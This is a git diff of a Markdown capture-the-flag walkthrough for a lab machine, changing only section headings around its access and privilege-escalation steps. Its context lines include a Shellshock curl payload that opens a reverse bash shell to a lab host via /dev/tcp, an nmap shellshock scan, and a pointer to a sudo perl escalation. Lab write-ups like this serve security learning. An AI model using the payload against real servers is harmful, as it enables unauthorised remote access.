@@ -24,7 +24,7 @@ feroxbuster -u http://10.10.10.56 -x html,php,json,js,sh,cgi,pl,docx,pdf,txt -w 
 + `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bc9402cf-aee0-410f-b78c-9ac7069a0151)
 
-## Privilege Escalation
+## Gaining Access
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/15545c15-606a-4e45-8555-0d886bd63fc2)
 
@@ -46,6 +46,9 @@ Alternatively, use `curl`:
 curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.5/5555 0>&1" http://10.10.10.56/cgi-bin/user.sh
 ```
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/998447b4-78ef-40c0-929c-17cfbd01c157)
+
+
+## Privilege Escalation
 
 + `sudo -l -l`
 + Check [gtfobins](https://gtfobins.github.io/) for [perl](https://gtfobins.github.io/gtfobins/perl/#sudo)
